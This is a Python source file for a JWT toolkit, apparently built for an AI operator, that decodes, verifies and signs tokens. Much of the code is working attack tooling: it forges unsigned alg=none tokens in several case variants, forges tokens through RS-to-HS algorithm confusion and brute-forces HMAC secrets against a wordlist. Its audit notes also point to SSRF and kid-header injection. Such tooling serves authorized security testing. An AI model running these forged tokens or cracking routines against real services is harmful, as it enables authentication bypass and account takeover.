"""Decode, audit, verify, forge, and attack JSON Web Tokens (JWT/JWS).

A capable JWT toolkit for an LLM operator. It covers the whole workflow:

  decode   parse header+claims, decode timestamps, and flag weaknesses
  verify   check a token's signature with a secret (HS*) or public key (RS/ES/...)
  sign     forge a token from a header+payload with a key and algorithm
  crack    brute-force an HS* secret against a wordlist
  attack   auto-run the applicable attacks and emit forged tokens:
             - alg=none / None / NONE (unsigned-token acceptance)
             - RS->HS algorithm confusion (sign with the RSA public key as the
               HMAC secret; works if the server verifies HS with its RS pubkey)
             - weak HMAC secret (dictionary crack)

Algorithms supported for sign/verify: none, HS256/384/512, RS256/384/512,
PS256/384/512, ES256/384/512, EdDSA (Ed25519). Implemented on ``cryptography`` +
stdlib (no PyJWT dependency), so nothing is hidden behind a library's defaults.

Dependencies: standard library + ``cryptography`` (for RS/PS/ES/EdDSA). HS* and
none need only the stdlib. No external API.

Safety: local crypto only — never sends the token anywhere. Forging/cracking are
for tokens you're authorized to test. A forged token is only useful against a
server that is actually vulnerable; this tool just produces the candidate.

Usage:
    python -m web.jwt_audit decode <token>
    python -m web.jwt_audit verify <token> --secret 's3cr3t'
    python -m web.jwt_audit sign  --alg HS256 --secret key --payload '{"user":"admin"}'
    python -m web.jwt_audit crack <token> --wordlist rockyou.txt
    python -m web.jwt_audit attack <token> --public-key server.pem --wordlist words.txt
"""

from __future__ import annotations

import argparse
import base64
import hashlib
import hmac
import json
import sys
from datetime import datetime, timezone

# Map JOSE alg -> hashlib name for HMAC/RSA/ECDSA families.
_HASH = {"256": hashlib.sha256, "384": hashlib.sha384, "512": hashlib.sha512}
_TIME_CLAIMS = ("exp", "nbf", "iat")


# --- base64url helpers ------------------------------------------------------

def b64url_decode(seg: str) -> bytes:
    seg = seg.encode() if isinstance(seg, str) else seg
    return base64.urlsafe_b64decode(seg + b"=" * (-len(seg) % 4))


def b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def split(token: str) -> tuple[str, str, str]:
    parts = token.strip().split(".")
    if len(parts) != 3:
        raise ValueError(f"not a JWS/JWT (expected 3 dot-separated parts, got {len(parts)})")
    return parts[0], parts[1], parts[2]


def decode(token: str) -> dict:
    """Decode a token into {header, payload, signature_b64, signing_input}."""
    h_b64, p_b64, s_b64 = split(token)
    try:
        header = json.loads(b64url_decode(h_b64))
        payload = json.loads(b64url_decode(p_b64))
    except (ValueError, json.JSONDecodeError) as exc:
        raise ValueError(f"undecodable header/payload: {exc}") from exc
    return {"header": header, "payload": payload, "signature_b64": s_b64,
            "signing_input": f"{h_b64}.{p_b64}"}


# --- signing / verification -------------------------------------------------

def _hmac_sign(signing_input: str, secret: bytes, bits: str) -> bytes:
    return hmac.new(secret, signing_input.encode(), _HASH[bits]).digest()


def _es_sizes(bits: str) -> int:
    return {"256": 32, "384": 48, "512": 66}[bits]


def sign(header: dict, payload: dict, key, alg: str | None = None) -> str:
    """Build a signed token. ``key`` is a str/bytes secret for HS*, or a PEM
    private key (str/bytes) for RS/PS/ES/EdDSA. ``none`` yields an empty sig."""
    alg = alg or header.get("alg", "HS256")
    header = {**header, "alg": alg}
    if "typ" not in header:
        header["typ"] = "JWT"
    signing_input = f"{b64url_encode(json.dumps(header, separators=(',', ':')).encode())}." \
                    f"{b64url_encode(json.dumps(payload, separators=(',', ':')).encode())}"
    fam, bits = alg[:2], alg[2:]

    if alg.lower() == "none":
        return signing_input + "."
    if fam == "HS":
        secret = key.encode() if isinstance(key, str) else key
        return f"{signing_input}.{b64url_encode(_hmac_sign(signing_input, secret, bits))}"

    # Asymmetric: needs cryptography + a PEM private key.
    from cryptography.hazmat.primitives import hashes, serialization
    from cryptography.hazmat.primitives.asymmetric import ec, ed25519, padding, utils
    pem = key.encode() if isinstance(key, str) else key
    priv = serialization.load_pem_private_key(pem, password=None)
    data = signing_input.encode()
    if fam == "RS":
        sig = priv.sign(data, padding.PKCS1v15(), getattr(hashes, f"SHA{bits}")())
    elif fam == "PS":
        h = getattr(hashes, f"SHA{bits}")()
        sig = priv.sign(data, padding.PSS(mgf=padding.MGF1(h), salt_length=padding.PSS.DIGEST_LENGTH), h)
    elif fam == "ES":
        der = priv.sign(data, ec.ECDSA(getattr(hashes, f"SHA{bits}")()))
        r, s = utils.decode_dss_signature(der)
        size = _es_sizes(bits)
        sig = r.to_bytes(size, "big") + s.to_bytes(size, "big")
    elif alg == "EdDSA":
        sig = priv.sign(data)
    else:
        raise ValueError(f"unsupported alg for signing: {alg}")
    return f"{signing_input}.{b64url_encode(sig)}"


def verify(token: str, key) -> dict:
    """Verify a token's signature. ``key`` is the HS secret or a PEM public key.
    Returns {"valid": bool, "alg": str, "reason": str}."""
    d = decode(token)
    alg = d["header"].get("alg", "")
    fam, bits = alg[:2], alg[2:]
    sig = b64url_decode(d["signature_b64"])
    si = d["signing_input"]
    try:
        if alg.lower() == "none":
            return {"valid": sig == b"", "alg": alg, "reason": "alg=none (unsigned)"}
        if fam == "HS":
            secret = key.encode() if isinstance(key, str) else key
            ok = hmac.compare_digest(sig, _hmac_sign(si, secret, bits))
            return {"valid": ok, "alg": alg, "reason": "HMAC " + ("match" if ok else "mismatch")}
        from cryptography.exceptions import InvalidSignature
        from cryptography.hazmat.primitives import hashes, serialization
        from cryptography.hazmat.primitives.asymmetric import ec, padding, utils
        pem = key.encode() if isinstance(key, str) else key
        pub = serialization.load_pem_public_key(pem)
        data = si.encode()
        try:
            if fam == "RS":
                pub.verify(sig, data, padding.PKCS1v15(), getattr(hashes, f"SHA{bits}")())
            elif fam == "PS":
                h = getattr(hashes, f"SHA{bits}")()
                pub.verify(sig, data, padding.PSS(mgf=padding.MGF1(h),
                           salt_length=padding.PSS.DIGEST_LENGTH), h)
            elif fam == "ES":
                size = _es_sizes(bits)
                r = int.from_bytes(sig[:size], "big")
                s = int.from_bytes(sig[size:], "big")
                pub.verify(utils.encode_dss_signature(r, s), data,
                           ec.ECDSA(getattr(hashes, f"SHA{bits}")()))
            elif alg == "EdDSA":
                pub.verify(sig, data)
            else:
                return {"valid": False, "alg": alg, "reason": f"unsupported alg {alg}"}
            return {"valid": True, "alg": alg, "reason": "signature valid"}
        except InvalidSignature:
            return {"valid": False, "alg": alg, "reason": "signature invalid for this key"}
    except Exception as exc:
        return {"valid": False, "alg": alg, "reason": f"{type(exc).__name__}: {exc}"}


# --- analysis ---------------------------------------------------------------

def analyze(token: str) -> dict:
    """Decode + flag weaknesses/attack surface. Returns decode() plus 'findings'
    (ranked) and human-decoded timestamps."""
    d = decode(token)
    header, payload = d["header"], d["payload"]
    findings: list[dict] = []

    def flag(level, note):
        findings.append({"level": level, "note": note})

    alg = str(header.get("alg", ""))
    if alg.lower() == "none":
        flag("high", "alg=none: token is unsigned — if the server accepts it, forge freely")
    if alg.startswith("HS"):
        flag("info", "HS* (symmetric): if you can guess/crack the secret you can forge; "
                     "also test RS->HS confusion if the server normally uses RS*")
    for hdr, why in (("jku", "server may fetch signing keys from this URL — SSRF / attacker-JWKS"),
                     ("x5u", "server may fetch an X.509 cert from this URL — SSRF / key injection"),
                     ("jwk", "embedded public key — some libs trust it (CVE-2018-0114 class)"),
                     ("kid", "key id is often injected into a path/SQL query — try traversal/SQLi")):
        if hdr in header:
            flag("high" if hdr in ("jku", "x5u", "jwk") else "medium",
                 f"header '{hdr}'={header[hdr]!r}: {why}")

    now = datetime.now(timezone.utc).timestamp()
    times = {}
    for c in _TIME_CLAIMS:
        if c in payload and isinstance(payload[c], (int, float)):
            times[c] = datetime.fromtimestamp(payload[c], timezone.utc).isoformat()
    if "exp" not in payload:
        flag("medium", "no 'exp' claim: token may never expire")
    elif isinstance(payload.get("exp"), (int, float)) and payload["exp"] < now:
        flag("info", f"token is expired ({times.get('exp')})")
    for sk in ("password", "pwd", "secret", "ssn", "credit", "api_key"):
        if any(sk in str(k).lower() for k in payload):
            flag("medium", f"claim name contains sensitive term '{sk}'")

    order = {"high": 0, "medium": 1, "info": 2}
    findings.sort(key=lambda f: order.get(f["level"], 3))
    return {**d, "times": times, "findings": findings}


# --- attacks ----------------------------------------------------------------

def crack_hs(token: str, words) -> str | None:
    """Return the first wordlist entry whose HMAC verifies the token, else None."""
    d = decode(token)
    alg = d["header"].get("alg", "")
    if not alg.startswith("HS"):
        return None
    bits = alg[2:]
    target = b64url_decode(d["signature_b64"])
    si = d["signing_input"]
    for w in words:
        w = w.rstrip("\r\n")
        if hmac.compare_digest(target, _hmac_sign(si, w.encode(), bits)):
            return w
    return None


def attack(token: str, *, public_key: str | bytes | None = None, words=None) -> dict:
    """Run applicable attacks; return viable ones with forged tokens where possible."""
    d = decode(token)
    header, payload = d["header"], d["payload"]
    results: list[dict] = []

    # 1. alg=none variants.
    for variant in ("none", "None", "NONE", "nOnE"):
        results.append({"attack": "alg-none", "variant": variant,
                        "token": sign({**header, "alg": variant}, payload, "", "none"),
                        "note": "works if the server accepts unsigned tokens"})

    # 2. RS->HS algorithm confusion (needs the server's RSA/EC public key PEM).
    if public_key is not None:
        pem = public_key.encode() if isinstance(public_key, str) else public_key
        forged = sign({**header, "alg": "HS256"}, payload, pem, "HS256")
        results.append({"attack": "alg-confusion(RS->HS256)", "token": forged,
                        "note": "server-side pubkey used as HMAC secret; works if the "
                                "verify code passes the RS public key to an HS verifier"})

    # 3. weak HMAC secret.
    if words is not None:
        secret = crack_hs(token, words)
        if secret is not None:
            results.append({"attack": "weak-hmac-secret", "secret": secret,
                            "token": sign(header, payload, secret, header.get("alg")),
                            "note": "HMAC secret recovered; you can forge arbitrary tokens"})
    return {"header": header, "payload": payload, "attacks": results}


# --- rendering + CLI --------------------------------------------------------

def _decode_lines(res: dict) -> list[str]:
    lines = ["# jwt decode",
             "## header",  json.dumps(res["header"], indent=2),
             "## payload", json.dumps(res["payload"], indent=2)]
    if res.get("times"):
        lines.append("# timestamps: " + ", ".join(f"{k}={v}" for k, v in res["times"].items()))
    lines.append(f"# signature: {res['signature_b64'][:40]}{'...' if len(res['signature_b64'])>40 else ''}")
    if res.get("findings"):
        lines.append("## FINDINGS")
        lines += [f"[{f['level'].upper()}] {f['note']}" for f in res["findings"]]
    return lines


def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        prog="web.jwt_audit",
        description="Decode, audit, verify, forge, and attack JWTs.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="algorithms: none, HS256/384/512, RS256/384/512, PS256/384/512, "
               "ES256/384/512, EdDSA\n",
    )
    sub = p.add_subparsers(dest="action")

    d = sub.add_parser("decode", help="Decode + audit a token (default).")
    d.add_argument("token")
    d.add_argument("--json", action="store_true")

    v = sub.add_parser("verify", help="Verify a signature.")
    v.add_argument("token")
    v.add_argument("--secret", help="HS* shared secret.")
    v.add_argument("--key", metavar="PEM", help="Public key PEM file for RS/PS/ES/EdDSA.")
    v.add_argument("--json", action="store_true")

    s = sub.add_parser("sign", help="Forge a token.")
    s.add_argument("--alg", required=True)
    s.add_argument("--secret", help="HS* secret.")
    s.add_argument("--key", metavar="PEM", help="Private key PEM file for RS/PS/ES/EdDSA.")
    s.add_argument("--payload", required=True, help="JSON claims.")
    s.add_argument("--header", default="{}", help="Extra JSON header fields.")

    c = sub.add_parser("crack", help="Brute-force an HS* secret.")
    c.add_argument("token")
    c.add_argument("--wordlist", required=True)
    c.add_argument("--json", action="store_true")

    a = sub.add_parser("attack", help="Auto-run applicable attacks.")
    a.add_argument("token")
    a.add_argument("--public-key", metavar="PEM", help="Server public key PEM (for RS->HS).")
    a.add_argument("--wordlist", help="Wordlist for weak-secret cracking.")
    a.add_argument("--json", action="store_true")
    return p


def _load(pathmaybe: str | None) -> bytes | None:
    if not pathmaybe:
        return None
    with open(pathmaybe, "rb") as fh:
        return fh.read()


def main(argv: list[str] | None = None) -> int:
    from common.output import emit
    args = build_parser().parse_args(argv)
    action = args.action or ("decode" if False else None)
    if action is None:
        build_parser().print_help(sys.stderr)
        return 2
    try:
        if args.action == "decode":
            res = analyze(args.token)
            emit(res, as_json=args.json, lines=_decode_lines(res))
        elif args.action == "verify":
            key = args.secret if args.secret else _load(args.key)
            if key is None:
                print("error: provide --secret (HS) or --key PEM (RS/ES/...)", file=sys.stderr)
                return 1
            res = verify(args.token, key)
            emit(res, as_json=args.json,
                 lines=[f"# verify: {'VALID' if res['valid'] else 'INVALID'}  "
                        f"alg={res['alg']}  ({res['reason']})"])
        elif args.action == "sign":
            key = args.secret if args.secret else _load(args.key)
            tok = sign(json.loads(args.header), json.loads(args.payload), key or "", args.alg)
            print(tok)
        elif args.action == "crack":
            with open(args.wordlist, encoding="utf-8", errors="ignore") as fh:
                secret = crack_hs(args.token, fh)
            res = {"cracked": secret is not None, "secret": secret}
            emit(res, as_json=args.json,
                 lines=[f"# crack: {'FOUND secret=' + secret if secret else 'not found'}"])
        elif args.action == "attack":
            words = None
            if args.wordlist:
                words = open(args.wordlist, encoding="utf-8", errors="ignore")
            res = attack(args.token, public_key=_load(args.public_key), words=words)
            if words:
                words.close()
            lines = ["# jwt attack — forged token candidates:"]
            for a in res["attacks"]:
                lines.append(f"## {a['attack']}" + (f" ({a.get('variant') or a.get('secret','')})"
                             if a.get('variant') or a.get('secret') else ""))
                lines.append(a["token"])
                lines.append(f"   note: {a['note']}")
            emit(res, as_json=args.json, lines=lines)
    except (ValueError, OSError, json.JSONDecodeError) as exc:
        print(f"error: {exc}", file=sys.stderr)
        return 1
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
